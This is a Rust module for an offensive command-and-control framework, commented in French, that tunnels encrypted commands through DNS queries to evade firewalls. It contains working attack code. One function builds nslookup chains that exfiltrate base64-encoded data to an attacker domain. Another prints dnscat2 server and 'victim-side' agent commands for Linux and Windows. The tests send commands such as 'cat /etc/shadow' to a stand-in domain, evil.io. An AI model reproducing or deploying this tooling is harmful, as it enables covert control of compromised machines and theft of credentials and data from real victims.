//! DIAPILE C2 — Canal DNS tunneling
//!
//! Encode les données C2 dans des requêtes DNS TXT/A records.
//! Passe quasi tous les firewalls (port 53 UDP rarement filtré en sortie).
//!
//! **SÉCURITÉ OBLIGATOIRE (QW2)** : tout payload est chiffré AES-256-GCM avec
//! une **clé dérivée par canal** via HKDF-SHA256 depuis `C2_MASTER_KEY`
//! (fallback rétrocompatible sur `C2_SHARED_KEY`). Info HKDF = `"c2/dns/channel-02"`.
//! Wire format labels: `{i}.{b64url_chunk}.cmd.{agent_id}.{domain}`
//!
//! Chargez la clé DNS via `load_dns_key()` plutôt que d'importer `C2_SHARED_KEY`
//! en dur : cela garantit que la clé HTTP/DNS/SOCKS sont **différentes en mémoire**
//! (un agent compromis ne brule pas tout le C2).
#![allow(dead_code)]

use super::crypto::{aes_gcm_decrypt, aes_gcm_encrypt, load_channel_key, C2Channel};
use base64::Engine;

/// Charge la clé 32-octets DÉDIÉE au canal DNS (dérivée via HKDF-SHA256 depuis
/// `C2_MASTER_KEY` avec info=`"c2/dns/channel-02"`). Rétrocompatible si seule
/// `C2_SHARED_KEY` est présente dans l'environnement.
///
/// Appelez CE PATTERN plutôt que `load_c2_shared_key()` : isolation de canal.
pub fn load_dns_key() -> Result<[u8; 32], Box<dyn std::error::Error + Send + Sync>> {
    load_channel_key(C2Channel::Dns)
}

/// Encode une commande C2 CHIFFRÉE AES-256-GCM pour transmission DNS TXT
/// (labels 63-chars max). Retourne la liste des FQDN labels de requêtes DNS.
///
/// - `command`: texte clair à envoyer (ex: `"whoami"`)
/// - `agent_id`: identifiant agent beacon
/// - `domain`: domaine C2 (ex: `"c2.example.com"`)
/// - `key`: clé partagée 32-octets (préférez `load_dns_key()` pour isolation canal)
pub fn encode_dns_cmd(
    command: &str,
    agent_id: &str,
    domain: &str,
    key: &[u8; 32],
) -> Result<Vec<String>, Box<dyn std::error::Error + Send + Sync>> {
    let ciphertext = aes_gcm_encrypt(key, command.as_bytes())?;

    let encoded = base64::engine::general_purpose::STANDARD
        .encode(&ciphertext)
        .replace('+', "-")
        .replace('/', "_")
        .replace('=', "");

    // Split en 63-char chunks (DNS label max length)
    let chunks: Vec<String> = encoded
        .chars()
        .collect::<Vec<_>>()
        .chunks(63)
        .enumerate()
        .map(|(i, c)| {
            format!(
                "{}.{}.cmd.{}.{}",
                i,
                c.iter().collect::<String>(),
                agent_id,
                domain
            )
        })
        .collect();

    Ok(chunks)
}

/// Décode + déchiffre un ensemble de labels DNS (réciproque de encode_dns_cmd).
/// Utilisé côté serveur C2 pour reconstituer la commande.
pub fn decode_dns_cmd(
    labels: &[&str],
    key: &[u8; 32],
) -> Result<String, Box<dyn std::error::Error + Send + Sync>> {
    // Reconstitue base64url à partir des labels (champ à l'index [1] après split '.')
    let combined: String = labels
        .iter()
        .filter_map(|l| l.split('.').nth(1))
        .collect::<Vec<_>>()
        .join("")
        .replace('-', "+")
        .replace('_', "/");

    let padded = match combined.len() % 4 {
        2 => format!("{}==", combined),
        3 => format!("{}=", combined),
        _ => combined,
    };

    let ciphertext = base64::engine::general_purpose::STANDARD
        .decode(padded)
        .map_err(|e| format!("base64 decode: {}", e))?;

    let plain = aes_gcm_decrypt(key, &ciphertext)?;
    String::from_utf8(plain).map_err(|e| format!("utf8: {}", e).into())
}

/// Décode une réponse DNS TXT en commande (rétro-compat; ancien chemin non
/// chiffré pour lecture logs — retourne None si format invalide).
#[deprecated(note = "Utilisez decode_dns_cmd avec la clé AES-GCM partagée")]
pub fn decode_dns_response(labels: &[&str]) -> Option<String> {
    let combined: String = labels
        .iter()
        .filter_map(|l| l.split('.').nth(1))
        .collect::<Vec<_>>()
        .join("")
        .replace('-', "+")
        .replace('_', "/");

    let padded = match combined.len() % 4 {
        2 => format!("{}==", combined),
        3 => format!("{}=", combined),
        _ => combined,
    };

    base64::engine::general_purpose::STANDARD
        .decode(padded)
        .ok()
        .and_then(|b| String::from_utf8(b).ok())
}

/// Génère les commandes pour configurer un serveur DNS C2
pub fn dns_c2_setup_cmds(domain: &str, server_ip: &str) -> Vec<String> {
    vec![
        format!("# 1. Ajouter enregistrement NS dans votre DNS"),
        format!("# ns1.{} → {}", domain, server_ip),
        format!("# c2.{} NS ns1.{}", domain, domain),
        format!(""),
        format!("# 2. Lancer le serveur DNS C2 (dnscat2)"),
        format!("dnscat2-server c2.{}", domain),
        format!(""),
        format!("# 3. Agent côté victime — REQUIERT variable C2_SHARED_KEY (64 hex)"),
        format!("#    Les commandes AES-GCM sont chiffrées AVANT base64url dans les labels."),
        format!(
            "dnscat --dns server={},domain=c2.{} --secret=SHARED_SECRET",
            server_ip, domain
        ),
        format!(""),
        format!("# 4. Agent côté victime (Windows)"),
        format!("dnscat2.exe c2.{} --secret=SHARED_SECRET", domain),
    ]
}

/// Génère un payload bash qui exfiltre des données via DNS
/// (non-chiffré ici ; exfiltration générique hors C2 protocole interne).
pub fn dns_exfil_payload(data: &str, domain: &str) -> String {
    let encoded = base64::engine::general_purpose::STANDARD.encode(data.as_bytes());
    let chunks: Vec<String> = encoded
        .chars()
        .collect::<Vec<_>>()
        .chunks(30)
        .map(|c| c.iter().collect::<String>())
        .collect();

    let dns_queries: Vec<String> = chunks
        .iter()
        .enumerate()
        .map(|(i, chunk)| format!("nslookup {}.{}.{}", i, chunk, domain))
        .collect();

    dns_queries.join(" && ")
}

// ── Tests unitaires AES-GCM DNS roundtrip (AC-4) ────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use rand::RngCore;

    fn random_key() -> [u8; 32] {
        let mut k = [0u8; 32];
        rand::thread_rng().fill_bytes(&mut k);
        k
    }

    #[test]
    fn c2_dns_roundtrip() {
        // AC-4 : encode + base64 split + decode → égalité plaintext
        let k = random_key();
        let cmd = "whoami && hostname && ipconfig";
        let labels_vec = encode_dns_cmd(cmd, "agent-001", "c2.example.com", &k).expect("encode");
        let labels_ref: Vec<&str> = labels_vec.iter().map(|s| s.as_str()).collect();
        let recovered = decode_dns_cmd(&labels_ref, &k).expect("decode");
        assert_eq!(recovered, cmd);
    }

    #[test]
    fn c2_dns_wrong_key_rejects() {
        let k1 = random_key();
        let mut k2 = k1;
        k2[31] ^= 0xAA; // flip dernière octet
        let labels_vec = encode_dns_cmd("cat /etc/shadow", "a1", "evil.io", &k1).unwrap();
        let labels_ref: Vec<&str> = labels_vec.iter().map(|s| s.as_str()).collect();
        assert!(
            decode_dns_cmd(&labels_ref, &k2).is_err(),
            "clé voisine doit rejeter le ciphertext DNS"
        );
    }
}
